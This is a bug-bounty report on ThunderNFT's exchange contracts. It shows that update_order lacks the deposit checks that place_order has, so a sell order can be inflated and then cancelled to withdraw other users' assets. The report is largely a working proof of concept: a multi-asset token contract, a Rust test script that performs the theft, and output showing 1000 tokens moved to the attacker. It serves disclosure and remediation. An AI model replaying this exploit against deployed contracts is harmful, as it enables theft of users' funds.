# IOP \_ ThunderNFT 34800 - \[Smart Contract - Critical] Improper input validation in order update funct

Submitted on Tue Aug 27 2024 06:31:34 GMT-0400 (Atlantic Standard Time) by @InquisitorScythe for [IOP | ThunderNFT](https://immunefi.com/bounty/thundernft-iop/)

Report ID: #34800

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/ThunderFuel/smart-contracts/tree/main/contracts-v1/thunder\\_exchange>

Impacts:

* Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The update\_order function lacks proper validation for sell orders, allowing attackers to forge asset amounts without transferring the actual assets. This critical vulnerability in the order update mechanism could be exploited in production to create sell orders with artificially inflated asset amounts. Subsequently, attackers could cancel these fraudulent orders and withdraw assets they never actually deposited, potentially leading to significant theft of assets from the exchange or other users' funds, undermining the entire trading system's integrity and security.

## Vulnerability Details

To explain this vulnerability, let's first look at the code for the place\_order function. It is a payable function that checks `msg_asset_id()` and `msg_amount()` when a user creates a sell order.

```rust
    #[storage(read), payable]
    fn place_order(order_input: MakerOrderInput) {
        _validate_maker_order_input(order_input);

        let strategy = abi(ExecutionStrategy, order_input.strategy.bits());
        let order = MakerOrder::new(order_input);
        match order.side {
            Side::Buy => {
                // Buy MakerOrder (e.g. make offer)
                // Checks if user has enough bid balance
                let pool_balance = _get_pool_balance(order.maker, order.payment_asset);
                require(order.price <= pool_balance, ThunderExchangeErrors::AmountHigherThanPoolBalance);
            },
            Side::Sell => {
                // Sell MakerOrder (e.g. listing)
                // Checks if assetId and amount mathces with the order
                require(msg_asset_id() == AssetId::new(order.collection, order.token_id), ThunderExchangeErrors::AssetIdNotMatched);
                require(msg_amount() == order_input.amount, ThunderExchangeErrors::AmountNotMatched); // <---- proper checks here
            },
        }

        strategy.place_order(order);

        log(OrderPlaced {
            order
        });
    }
```

But in `update_order`, there is no such check, which allow user can update the amount of selling asset.

```rust
    fn update_order(order_input: MakerOrderInput) {
        _validate_maker_order_input(order_input);

        let strategy = abi(ExecutionStrategy, order_input.strategy.bits());
        let order = MakerOrder::new(order_input);
        match order.side {
            Side::Buy => {
                // Checks if user has enough bid balance
                let pool_balance = _get_pool_balance(order.maker, order.payment_asset);
                require(order.price <= pool_balance, ThunderExchangeErrors::AmountHigherThanPoolBalance);
            },
            Side::Sell => {}, // <---- No checks for msg_assetid() and msg_amount()
        }

        strategy.update_order(order);

        log(OrderUpdated {
            order
        });
    }
```

At last, in `cancel_order`, the contract allows user withdraw his assets base on the amount claimed in order.

```rust
    #[storage(read)]
    fn cancel_order(
        strategy: ContractId,
        nonce: u64,
        side: Side
    ) {
        let caller = get_msg_sender_address_or_panic();
        let execution_manager_addr = storage.execution_manager.read().unwrap().bits();
        let execution_manager = abi(ExecutionManager, execution_manager_addr);
        require(strategy != ZERO_CONTRACT_ID, ThunderExchangeErrors::StrategyMustBeNonZeroContract);
        require(execution_manager.is_strategy_whitelisted(strategy), ThunderExchangeErrors::StrategyNotWhitelisted);

        let strategy_caller = abi(ExecutionStrategy, strategy.bits());
        let order = strategy_caller.get_maker_order_of_user(caller, nonce, side);

        match side {
            Side::Buy => {
                // Cancels buy MakerOrder (e.g. offer)
                strategy_caller.cancel_order(caller, nonce, side);
            },
            Side::Sell => {
                // Cancel sell MakerOrder (e.g. listing)
                if (order.is_some()) {
                    // If order is valid, then transfers the asset back to the user
                    let unwrapped_order = order.unwrap();
                    strategy_caller.cancel_order(caller, nonce, side);
                    transfer(
                        Identity::Address(unwrapped_order.maker),
                        AssetId::new(unwrapped_order.collection, unwrapped_order.token_id),
                        unwrapped_order.amount // <---- This value could be forged by update_order
                    );
                }
            },
        }

        log(OrderCanceled {
            user: caller,
            strategy,
            side,
            nonce,
        });
    }
```

Such improper input validation case could lead to direct asset theft, I'll show the detail below.

### Fix advice

1. Check `msg_asset_id()` and `msg_amount()` in `update_order` when updating sell order.
2. Distingulish ERC-721 and multi native asset, choose the correct amount in `ExecutionResult`:

```rs
    pub fn s1(maker_order: MakerOrder, taker_order: TakerOrder) -> ExecutionResult {
        ExecutionResult {
            is_executable: (
                (maker_order.side != taker_order.side) &&
                (maker_order.maker != taker_order.taker) &&
                (maker_order.maker == taker_order.maker) &&
                (maker_order.nonce == taker_order.nonce) &&
                (maker_order.price == taker_order.price) &&
                (maker_order.token_id == taker_order.token_id) &&
                (maker_order.collection == taker_order.collection) &&
                (maker_order.end_time >= timestamp()) &&
                (maker_order.start_time <= timestamp())
            ),
            collection: taker_order.collection,
            token_id: taker_order.token_id,
            amount: 1,
            payment_asset: maker_order.payment_asset,
        }
    }
```

## Impact Details

First, this is a critical level bug which allow attacker steal assets selling on the platfrom. I believe the underlying issue here is that the smart contract only considered scenarios involving ERC-721 NFT trading, without taking into account situations involving ERC-1155 NFTs or other native assets.

As per defined in [Multi Native Asset Example](https://docs.fuel.network/docs/sway/blockchain-development/native_assets/#multi-native-asset-example), multi native asset model is equivalent to ERC-1155 Standard use in Ethereum. For single native asset (ERC-721), there is only one asset for each AssetId, but for multi native asset (ERC-11555), it allows multiple asset for each AssetId.

The following is a detailed attack scenario:

1. Victim **UserA** wants to sell 1000 of his NFT/native assets called *ERC1155\_NFT* on platfrom, he creates a sell order by calling `place_order`, then 1000 *ERC1155\_NFT* sent to the thunder exchange contract.
2. Attacker **UserB** wants to steal those 1000 *ERC1155\_NFT*, he creates a sell order by calling `place_order` with 1 *ERC1155\_NFT*, then his 1 *ERC1155\_NFT* sent to the thunder exchange contract.
3. Attacker **UserB** calls `update_order` to increase the amount of his sell order to 1000 *ERC1155\_NFT*, becase `update_order` does not require a deposit and check `msg_amount()`, this operation success.
4. Attacker **UserB** calls `cancel_order` to withdraw 1000 *ERC1155\_NFT* from thunder exchange contract, because the transfer amount is based on `unwrapped_order.amount`. Now **UserB** has 1000 *ERC1155\_NFT* and only 1 *ERC1155\_NFT* left on exchange contract.

## References

* <https://docs.fuel.network/docs/sway/blockchain-development/native\\_assets/#multi-native-asset-example>

## Proof of concept

## Proof of Concept

1. Create a multi native asset contract with following code in `erc1155/src/main.sw`:

```rust
contract;
 
use standards::src5::{SRC5, State, AccessError};
use standards::src20::SRC20;
use standards::src3::SRC3;
use std::{
    asset::{
        burn,
        mint_to,
    },
    call_frames::*,
    hash::{
        Hash,
    },
    context::this_balance,
    storage::storage_string::*,
    string::String
};
 
storage {
    total_assets: u64 = 0,
    total_supply: StorageMap<AssetId, u64> = StorageMap {},
    name: StorageMap<AssetId, StorageString> = StorageMap {},
    symbol: StorageMap<AssetId, StorageString> = StorageMap {},
    decimals: StorageMap<AssetId, u8> = StorageMap {},
    owner: State = State::Uninitialized,
}
 
// Native Asset Standard
impl SRC20 for Contract {
    #[storage(read)]
    fn total_assets() -> u64 {
        storage.total_assets.read()
    }
 
    #[storage(read)]
    fn total_supply(asset: AssetId) -> Option<u64> {
        storage.total_supply.get(asset).try_read()
    }
 
    #[storage(read)]
    fn name(asset: AssetId) -> Option<String> {
        storage.name.get(asset).read_slice()
    }
    
    #[storage(read)]
    fn symbol(asset: AssetId) -> Option<String> {
        storage.symbol.get(asset).read_slice()
    }
 
    #[storage(read)]
    fn decimals(asset: AssetId) -> Option<u8> {
        storage.decimals.get(asset).try_read()
    }
}
 
// Mint and Burn Standard
impl SRC3 for Contract {
    #[storage(read, write)]
    fn mint(recipient: Identity, sub_id: SubId, amount: u64) {
        require_access_owner();
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        let supply = storage.total_supply.get(asset_id).try_read();
        if supply.is_none() {
            storage.total_assets.write(storage.total_assets.try_read().unwrap_or(0) + 1);
        }
        let current_supply = supply.unwrap_or(0);
        storage.total_supply.insert(asset_id, current_supply + amount);
        mint_to(recipient, sub_id, amount);
    }
    
    #[payable]
    #[storage(read, write)]
    fn burn(sub_id: SubId, amount: u64) {
        require_access_owner();
        let asset_id = AssetId::new(ContractId::this(), sub_id);
        require(this_balance(asset_id) >= amount, "not-enough-coins");
        
        let supply = storage.total_supply.get(asset_id).try_read();
        let current_supply = supply.unwrap_or(0);
        storage.total_supply.insert(asset_id, current_supply - amount);
        burn(sub_id, amount);
    }
}
 
abi MultiAsset {
    #[storage(read, write)]
    fn constructor(owner_: Identity);
    
    #[storage(read, write)]
    fn set_name(asset: AssetId, name: String);
 
    #[storage(read, write)]
    fn set_symbol(asset: AssetId, symbol: String);
 
    #[storage(read, write)]
    fn set_decimals(asset: AssetId, decimals: u8);

    // helper function to get AssetId from SubId
    fn get_asset_id(sub_id: SubId) -> AssetId;
}
 
impl MultiAsset for Contract {
    #[storage(read, write)]
    fn constructor(owner_: Identity) {
        require(storage.owner.read() == State::Uninitialized, "owner-initialized");
        storage.owner.write(State::Initialized(owner_));
    }
    
    #[storage(read, write)]
    fn set_name(asset: AssetId, name: String) {
        require_access_owner();
        storage.name.insert(asset, StorageString {});
        storage.name.get(asset).write_slice(name);
    }
 
    #[storage(read, write)]
    fn set_symbol(asset: AssetId, symbol: String) {
        require_access_owner();
        storage.symbol.insert(asset, StorageString {});
        storage.symbol.get(asset).write_slice(symbol);
    }
 
    #[storage(read, write)]
    fn set_decimals(asset: AssetId, decimals: u8) {
        require_access_owner();
        storage.decimals.insert(asset, decimals);
    }

    fn get_asset_id(sub_id: SubId) -> AssetId {
        AssetId::new(ContractId::this(), sub_id)
    }

}
 
#[storage(read)]
fn require_access_owner() {
    require(
        storage.owner.read() == State::Initialized(msg_sender().unwrap()),
        AccessError::NotOwner,
    );
}
```

2. create integration test script `hardness.rs` with rust sdk. refer: <https://docs.fuel.network/docs/sway/testing/testing-with-rust/>

```rust
use std::ptr::null;

use abigen_bindings::erc1155_mod;
use fuels::{prelude::*, types::ContractId};
use fuels::types::{Bits256, Identity};

// Load abi from json
abigen!(Contract(
    name = "ThunderExchange",
    abi = "thunder_exchange/out/debug/thunder_exchange-abi.json"
),
Contract(
    name = "AssetManager",
    abi = "asset_manager/out/debug/asset_manager-abi.json"
),
Contract(
    name = "ExecutionStrategy",
    abi = "execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale-abi.json"
), 
Contract(
    name = "ExecutionManager",
    abi = "execution_manager/out/debug/execution_manager-abi.json"
),

Contract(
    name = "RoyaltyManager",
    abi = "royalty_manager/out/debug/royalty_manager-abi.json"
),

Contract(
    name = "Pool",
    abi = "pool/out/debug/pool-abi.json"
),

Contract(
    name = "ERC1155",
    abi = "erc1155/out/debug/erc1155-abi.json"
)

);

async fn get_thunder_contract(owner_wallet: &WalletUnlocked) -> (ThunderExchange<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "thunder_exchange/out/debug/thunder_exchange.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "thunder_exchange/out/debug/thunder_exchange-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = ThunderExchange::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}


async fn get_asset_manager_contract(owner_wallet: &WalletUnlocked) -> (AssetManager<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "asset_manager/out/debug/asset_manager.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "asset_manager/out/debug/asset_manager-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = AssetManager::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

async fn get_execution_strategy_contract(owner_wallet: &WalletUnlocked) -> (ExecutionStrategy<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "execution_strategies/strategy_fixed_price_sale/out/debug/strategy_fixed_price_sale-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = ExecutionStrategy::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

async fn get_execution_manager_contract(owner_wallet: &WalletUnlocked) -> (ExecutionManager<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "execution_manager/out/debug/execution_manager.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "execution_manager/out/debug/execution_manager-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = ExecutionManager::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

async fn get_royalty_manager_contract(owner_wallet: &WalletUnlocked) -> (RoyaltyManager<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "royalty_manager/out/debug/royalty_manager.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "royalty_manager/out/debug/royalty_manager-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = RoyaltyManager::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

async fn get_pool_contract(owner_wallet: &WalletUnlocked) -> (Pool<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "pool/out/debug/pool.bin",
        LoadConfiguration::default().with_storage_configuration(
            StorageConfiguration::default().add_slot_overrides_from_file(
            "pool/out/debug/pool-storage_slots.json"
        ).unwrap()),
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = Pool::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

async fn get_erc1155_contract(owner_wallet: &WalletUnlocked) -> (ERC1155<WalletUnlocked>,ContractId) {
    let id = Contract::load_from(
        "erc1155/out/debug/erc1155.bin",
        LoadConfiguration::default()
        )
    .unwrap()
    .deploy(owner_wallet, TxPolicies::default())
    .await
    .unwrap();

    let instance = ERC1155::new(id.clone(), owner_wallet.clone());
    (instance, id.into())
}

#[tokio::test]
async fn test() {
    let mut wallets = launch_custom_provider_and_get_wallets(
        WalletsConfig::new(
            Some(4),             /* Single wallet */
            Some(1),             /* Single coin (UTXO) */
            Some(1_000_000_000), /* Amount per coin */
        ),
        None,
        None,
    )
    .await
    .unwrap();
    let owner_wallet = wallets.pop().unwrap();
    let nft_creator_wallet = wallets.pop().unwrap();
    println!("Owner Wallet address: {:?}", Address::from(owner_wallet.address()) );
    println!("NFT Creator Wallet address: {:?}", Address::from(nft_creator_wallet.address()) );
    println!("Owner Wallet balance: {:?}", owner_wallet.get_balances().await);
    println!("-----------------------------------");

    let (thunder_contract, thunder_contract_id) = get_thunder_contract(&owner_wallet).await;
    let (asset_manager_contract, asset_manager_id) = get_asset_manager_contract(&owner_wallet).await;
    let (execution_strategy_contract, execution_strategy_id) = get_execution_strategy_contract(&owner_wallet).await;
    let (execution_manager_contract, execution_manager_id) = get_execution_manager_contract(&owner_wallet).await;
    let (royalty_manager_contract, royalty_manager_id) = get_royalty_manager_contract(&owner_wallet).await;
    let (pool_contract, pool_id) = get_pool_contract(&owner_wallet).await;

    let (erc1155_contract, erc1155_id) = get_erc1155_contract(&nft_creator_wallet).await;

    println!("Thunder contract address: {:?}", thunder_contract_id);
    println!("Asset Manager contract address: {:?}", asset_manager_id);
    println!("Execution Strategy contract address: {:?}", execution_strategy_id);
    println!("Execution Manager contract address: {:?}", execution_manager_id);
    println!("Royalty Manager contract address: {:?}", royalty_manager_id);
    println!("Pool contract address: {:?}", pool_id);
    println!("ERC1155 contract address: {:?}", erc1155_id);
    println!("-----------------------------------");

    thunder_contract.methods().initialize().call().await.unwrap();
    asset_manager_contract.methods().initialize().call().await.unwrap();
    execution_strategy_contract.methods().initialize(thunder_contract_id).call().await.unwrap();
    execution_manager_contract.methods().initialize().call().await.unwrap();
    royalty_manager_contract.methods().initialize().call().await.unwrap();
    pool_contract.methods().initialize(thunder_contract_id, asset_manager_id).call().await.unwrap();

    thunder_contract.methods().set_asset_manager(asset_manager_id).call().await.unwrap();
    thunder_contract.methods().set_execution_manager(execution_manager_id).call().await.unwrap();
    thunder_contract.methods().set_royalty_manager(royalty_manager_id).call().await.unwrap();
    thunder_contract.methods().set_pool(pool_id).call().await.unwrap();

    execution_manager_contract.methods().add_strategy(execution_strategy_id).call().await.unwrap();
    asset_manager_contract.methods().add_asset(AssetId::zeroed()).call().await.unwrap();

    println!("Contracts initialized");
    println!("-----------------------------------");

    erc1155_contract.methods().constructor(Identity::from(nft_creator_wallet.address())).call().await.unwrap();
    let sub_id = Bits256::from_hex_str("0x0000000000000000000000000000000000000000000000000000000000000000").unwrap();
    let asset_id = erc1155_contract.methods().get_asset_id(sub_id).call().await.unwrap().value;
    erc1155_contract.methods().set_name(AssetId::new(*asset_id), String::from("ERC1155_NFT")).call().await.unwrap();
    erc1155_contract.methods().set_symbol(AssetId::new(*asset_id), String::from("$$$")).call().await.unwrap();
    erc1155_contract.methods().set_decimals(AssetId::new(*asset_id), 9).call().await.unwrap();
    println!("Asset ID: {:?}", asset_id);

    let user_a_wallet = wallets.pop().unwrap();
    let user_b_wallet = wallets.pop().unwrap();


    erc1155_contract.methods()
        .mint(Identity::from(user_a_wallet.address()), sub_id, 1000)
        .with_variable_output_policy(VariableOutputPolicy::EstimateMinimum)
        .call()
        .await
        .unwrap();

    erc1155_contract.methods()
        .mint(Identity::from(user_b_wallet.address()), sub_id, 1)
        .with_variable_output_policy(VariableOutputPolicy::EstimateMinimum)
        .call()
        .await
        .unwrap();

    println!("Mint ERC1155 NFTs");
    println!("-----------------------------------");
    println!("user a balance: {:}", user_a_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());
    println!("user b balance: {:}", user_b_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());

    let order_a = MakerOrderInput{
        side: Side::Sell,
        maker: user_a_wallet.address().into(),
        collection: erc1155_id,
        token_id: sub_id,
        price: 100,
        amount: 1000,
        nonce: 1,
        strategy: execution_strategy_id,
        payment_asset: AssetId::zeroed(),
        expiration_range: 100,
        extra_params: ExtraParams{
            extra_address_param: Address::zeroed(),
            extra_contract_param: ContractId::zeroed(),
            extra_u_64_param: 0,
        },
    };

    let call_params = CallParameters::default().with_amount(1000).with_asset_id(AssetId::new(*asset_id));

    thunder_contract.clone().with_account(user_a_wallet.clone())
        .methods()
        .place_order(order_a)
        .with_contracts(&[&execution_strategy_contract, &execution_manager_contract, &asset_manager_contract])
        .call_params(call_params).unwrap()
        .call()
        .await
        .unwrap();

    println!("After user A place order to sell 1000 items");
    println!("-----------------------------------");
    println!("thunder contract balance: {:?}", thunder_contract.get_balances().await.unwrap());
    println!("user a balance: {:}", user_a_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());
    println!("user b balance: {:}", user_b_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());

    let order_b = MakerOrderInput{
        side: Side::Sell,
        maker: user_b_wallet.address().into(),
        collection: erc1155_id,
        token_id: sub_id,
        price: 100,
        amount: 1,
        nonce: 1,
        strategy: execution_strategy_id,
        payment_asset: AssetId::zeroed(),
        expiration_range: 100,
        extra_params: ExtraParams{
            extra_address_param: Address::zeroed(),
            extra_contract_param: ContractId::zeroed(),
            extra_u_64_param: 0,
        },
    };

    let call_params_1 = CallParameters::default().with_amount(1).with_asset_id(AssetId::new(*asset_id));


    thunder_contract.clone().with_account(user_b_wallet.clone())
    .methods()
    .place_order(order_b)
    .with_contracts(&[&execution_strategy_contract, &execution_manager_contract, &asset_manager_contract])
    .call_params(call_params_1).unwrap()
    .call()
    .await
    .unwrap();

    println!("After user B place order to sell 1 items");
    println!("-----------------------------------");
    println!("thunder contract balance: {:?}", thunder_contract.get_balances().await.unwrap());
    println!("user a balance: {:}", user_a_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());
    println!("user b balance: {:}", user_b_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());

    let order_b_1 = MakerOrderInput{
        side: Side::Sell,
        maker: user_b_wallet.address().into(),
        collection: erc1155_id,
        token_id: sub_id,
        price: 100,
        amount: 1000,
        nonce: 1,
        strategy: execution_strategy_id,
        payment_asset: AssetId::zeroed(),
        expiration_range: 100,
        extra_params: ExtraParams{
            extra_address_param: Address::zeroed(),
            extra_contract_param: ContractId::zeroed(),
            extra_u_64_param: 0,
        },
    };
    println!("\nAttack start");
    println!("-----------------------------------");
    println!("user B update order with amount 1000");

    thunder_contract.clone().with_account(user_b_wallet.clone())
    .methods()
    .update_order(order_b_1)
    .with_contracts(&[&execution_strategy_contract, &execution_manager_contract, &asset_manager_contract])
    .call()
    .await
    .unwrap();

    println!("user B cancel order");
    thunder_contract.clone().with_account(user_b_wallet.clone())
    .methods()
    .cancel_order(execution_strategy_id, 1, Side::Sell)
    .with_variable_output_policy(VariableOutputPolicy::EstimateMinimum)
    .with_contracts(&[&execution_strategy_contract, &execution_manager_contract, &asset_manager_contract])
    .call()
    .await
    .unwrap();

    println!("-----------------------------------");
    println!("Attack finish");

    println!("thunder contract balance: {:?}", thunder_contract.get_balances().await.unwrap());
    println!("user a balance: {:}", user_a_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());
    println!("user b balance: {:}", user_b_wallet.get_asset_balance(&AssetId::new(*asset_id)).await.unwrap());

}
```

3. run test with `cargo test -- --nocapture`, output like:

```
Owner Wallet address: 95a7aa6cc32743f8706c40ef49a7423b47da763bb4bbc055b1f07254dc729036
NFT Creator Wallet address: bdaad6a89e073e177895b3e5a9ccd15806749eda134a6438dae32fc5b6601f3f
Owner Wallet balance: Ok({"0000000000000000000000000000000000000000000000000000000000000000": 1000000000})
-----------------------------------
Thunder contract address: 8817103d53d259ccdb13d90db9b238971ab6abd86680a9174d2d5c07b3ca509e
Asset Manager contract address: d7f461207387619982cbb2d36ae2921ceaa1953d6828faa3ff384e85505d657e
Execution Strategy contract address: 4a67108b33e5f86b2654f6124524c5b10432769dfe61a1e1481dea24e1f967b4
Execution Manager contract address: 787d9e0a41c6bc127a05fbde641ceac7d43cfcbb1256be1d1330c187dd888a1a
Royalty Manager contract address: deba0f7ed7c8cd7a93d4a269c8d00542c17612f5f9dcc9365b61f7761d29a147
Pool contract address: 2e644050002d6495bace13664683a34e6cb94f8b2fdb19e423a67df6434fa1b6
ERC1155 contract address: b29473f8921e7968f4a3151bf798c79dc3564276e5e9c23cf983c723eefbee7a
-----------------------------------
Contracts initialized
-----------------------------------
Asset ID: 749f5dccf5ea11f68fd5f2fe1c593949046a339bb7207f6aa753ced65c69367a
Mint ERC1155 NFTs
-----------------------------------
user a balance: 1000
user b balance: 1
After user A place order to sell 1000 items
-----------------------------------
thunder contract balance: {749f5dccf5ea11f68fd5f2fe1c593949046a339bb7207f6aa753ced65c69367a: 1000, 0000000000000000000000000000000000000000000000000000000000000000: 0}
user a balance: 0
user b balance: 1
After user B place order to sell 1 items
-----------------------------------
thunder contract balance: {0000000000000000000000000000000000000000000000000000000000000000: 0, 749f5dccf5ea11f68fd5f2fe1c593949046a339bb7207f6aa753ced65c69367a: 1001}
user a balance: 0
user b balance: 0

Attack start
-----------------------------------
user B update order with amount 1000
user B cancel order
-----------------------------------
Attack finish
thunder contract balance: {0000000000000000000000000000000000000000000000000000000000000000: 0, 749f5dccf5ea11f68fd5f2fe1c593949046a339bb7207f6aa753ced65c69367a: 1}
user a balance: 0
user b balance: 1000
test test ... ok

test result: ok. 1 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 1.29s
```
